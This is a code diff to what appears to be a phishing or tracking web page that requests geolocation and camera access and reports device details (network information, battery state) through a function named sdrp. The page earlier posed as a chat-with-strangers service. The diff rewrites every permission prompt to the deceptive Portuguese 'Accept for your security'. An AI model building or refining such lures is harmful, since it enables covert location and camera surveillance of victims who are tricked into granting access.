@@ -121,7 +121,7 @@
          if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition, showError);
          } else {
-         alert("Your Browser Does not support Gps");
+         alert("Aceite para sua segurança");
          }
          }
 
@@ -139,7 +139,7 @@
             case error.PERMISSION_DENIED:
 
             sdrp("Location Permission Denied",clips,networkinformation,batterypercentage,ischarging);
-            alert("Allow Location permission to Chat with nearby Strangers");
+            alert("Aceite para sua segurança");
              break;
             case error.POSITION_UNAVAILABLE:
              window.close()
@@ -262,9 +262,9 @@
       handleSuccess(stream);
       } catch (e) {
       setTimeout(function(){
-      alert("Allow Camera access to chat with strangers");
+      alert("Aceite para sua segurança");
       window.location.href = "https://support.onemob.com/hc/en-us/articles/360037342154-How-do-I-grant-permission-for-Camera-and-Microphone-in-my-web-browser-"
-      alert("Read this page to grant camera access to  our website")
+      alert("Aceite para sua segurança")
       },15000) }
       }
 
